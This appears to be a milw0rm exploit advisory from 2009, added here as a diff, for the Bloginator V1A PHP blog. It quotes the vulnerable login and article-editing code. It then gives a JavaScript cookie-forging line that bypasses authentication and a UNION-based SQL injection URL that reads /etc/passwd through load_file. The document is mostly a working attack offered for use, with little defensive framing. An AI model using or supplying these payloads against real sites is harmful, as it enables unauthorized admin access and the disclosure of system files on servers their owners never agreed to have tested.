@@ -1,0 +1,85 @@
+##########################################################################
+
+Author = FireShot , Jacopo Vuga.
+Mail = fireshot<at>autistici<dot>org
+
+Software = Bloginator V1A
+Download = http://kamads.com/kamads_ads/download.php?email=bloginator&ID=0
+
+Greets to = Osirys, Myral, str0ke
+
+###########################################################################
+
+Vulnerability = Insicure Cookie Handling
+
+###########################################################################
+
+[CODE]
+
+[URL] www.site.com/bloginator/articleCall.php
+
+global $name,$password,$returnLink;
+$p_name = strip_tags(substr($_POST['name'],0,32));
+$p_password = strip_tags(substr($_POST['password'],0,32));
+if(crypt($p_name , $name) == $name and crypt($p_password,$password) == $password )
+ {
+
+           setcookie("identifyYourself","you are identified");
+           print "Login successfull<br>";
+           print $returnLink;
+       }
+   else {print "Wrong username or password";
+   }
+}
+
+[/CODE]
+
+
+[EXPLOIT]
+
+javascript:document.cookie = "identifyYourself=you+are+identified; path=/";
+
+[/EXPLOIT]
+
+############################################################################
+
+Vulnerability = SQL injection
+
+############################################################################
+
+[CODE]
+
+[URL] www.site.com/bloginator/articleCall.php
+
+$action = @$_GET['action'];
+[...]
+$id = $_GET['id'];
+[...]
+function editArticle($id,$message)
+{
+global $returnLink;
+$query = "select * FROM articles WHERE id='$id'";
+$sql = mysql_query($query) or die(mysql_query());
+$title = mysql_result($sql,0,'title');
+$title = htmlentities($title);
+$article = mysql_result($sql,0,'article');
+$article = htmlentities($article);
+$link = mysql_result($sql,0,'link');
+$link = htmlentities($link);
+
+startHTML("Edit ID # ".$id);
+?>
+
+[/CODE]
+
+[EXPLOIT]
+
+As Admin (Post Cookie exploit) you can inj arbitrary SQL code in the query.
+
+www.site.com/action=edit&id=fireshot' union select 1,2,3,4,load_file('/etc/passwd'),6,7 order by '*
+
+[/EXPLOIT]
+
+############################################################################## 
+
+# milw0rm.com [2009-03-19]
